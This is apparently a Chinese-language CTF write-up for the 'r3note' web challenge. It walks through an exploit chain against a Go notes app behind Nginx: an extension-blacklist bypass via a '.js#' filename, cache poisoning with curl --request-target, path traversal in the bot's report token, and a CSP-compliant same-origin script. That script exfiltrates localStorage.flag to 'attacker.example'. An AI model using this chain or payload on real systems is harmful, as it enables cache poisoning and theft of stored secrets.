# r3note

## 题目简述

题目是一套 Go 笔记应用，前面由 Nginx 反向代理。管理员 bot 先在同源 `localStorage.flag` 中写入 flag，再访问：

```text
/share/<用户提交的token>
```

利用链由文件扩展名绕过、原始 HTTP request-target、Nginx location 优先级与缓存键碰撞组成。最终让 bot 把上传的 HTML 当作同源页面打开，再加载同源 JavaScript 读取 `localStorage`。

## 解题过程

### 上传 JavaScript 与 HTML 包装页

注册并登录后，从 `/api/user/me` 取得自己的用户 UUID。图片上传接口只拒绝扩展名恰好为 `.js`、`.css`、`.html` 的文件：

```go
ext := filepath.Ext(header.Filename)
if ext == "" || ext == ".js" || ext == ".css" || ext == ".html" {
    return
}
```

先上传一个任意允许扩展名的文件，内容为：

```javascript
window.location =
  "https://attacker.example/collect?flag=" +
  encodeURIComponent(localStorage.getItem("flag"));
```

记返回的图片 ID 为 `js_id`。该文件可通过 `/api/image/js_id` 获取，但接口要求 `Referer` 的 Host 与当前 Host 相同；后续让同源 HTML 以 `<script>` 加载它，便能自然携带合法 Referer。

再上传文件名 `.js#`，其内容为：

```html
<!doctype html>
<script src="/api/image/js_id"></script>
```

Go 的 `filepath.Ext(".js#")` 返回 `.js#`，不在黑名单中。服务端保存文件名为：

```text
<html_id>.js#
```

### 用原始 `#` 请求污染 Nginx 缓存

Nginx 同时配置了：

```nginx
location /files/upload/ {
    deny all;
}

location ~ \.(css|js)$ {
    proxy_cache static_cache;
    proxy_cache_key $uri$is_args$args;
    proxy_pass http://127.0.0.1:3000;
}
```

正则 location 的优先级高于普通前缀 location，因此一个“看起来以 `.js` 结尾”的 URI 会绕过上传目录的 `deny all`。

普通浏览器不会把 URL fragment 发给服务器，所以不能直接访问磁盘上的 `.js#` 文件。需要发送包含字面量 `#` 的原始 request-target，例如：

```sh
curl --request-target \
  "/files/upload/<user_id>/<html_id>.js#" \
  "http://target/"
```

在该处理链中，Nginx 用去掉 fragment 的规范化 `$uri` 做 location 匹配和缓存键，键为：

```text
/files/upload/<user_id>/<html_id>.js
```

而上游静态路由取回的内容来自实际的 `.js#` 文件。这样，HTML 响应被缓存到了不带 `#` 的 `.js` 键下。之后直接请求：

```text
/files/upload/<user_id>/<html_id>.js
```

即可命中缓存，无需磁盘上真的存在 `.js` 文件。

### 让 bot 打开缓存页面

举报接口只检查 `token` 是字符串，没有限制路径字符。提交：

```json
{
  "token": "../files/upload/<user_id>/<html_id>.js"
}
```

bot 拼接出的 `/share/../files/...` 会被浏览器规范化为 `/files/...`，并命中刚才的 Nginx 缓存。响应虽然使用 `.js` 路径，内容却是 HTML；服务又没有设置：

```text
X-Content-Type-Options: nosniff
```

浏览器因此把它渲染为页面。CSP 为：

```text
default-src 'self'; script-src 'self'
```

它禁止外部脚本，却允许包装页加载 `/api/image/js_id` 这个同源脚本。该请求携带同源 Referer，通过图片接口检查；脚本读取 bot 预先写入的 `localStorage.flag`，再通过顶层跳转把值送到接收端。

## 方法总结

这条利用链的核心是“磁盘文件名、原始 request-target、Nginx 规范化 URI、缓存键、浏览器 URL”五种名称并不相同。`.js#` 同时绕过 Go 扩展名黑名单，并通过一次原始请求把 HTML 填入 `.js` 缓存键；举报路径遍历则把 bot 导向该键。

图片接口的 Referer 检查和 CSP 都没有被直接关闭，而是被同源 HTML→同源脚本的加载方式自然满足。逐步复现脚本见 [valgrind 的 r3note 题解](https://www.valgrindc.tf/posts/r3note/)，正文已保留必须使用 `curl --request-target` 预热缓存这一容易遗漏的步骤。
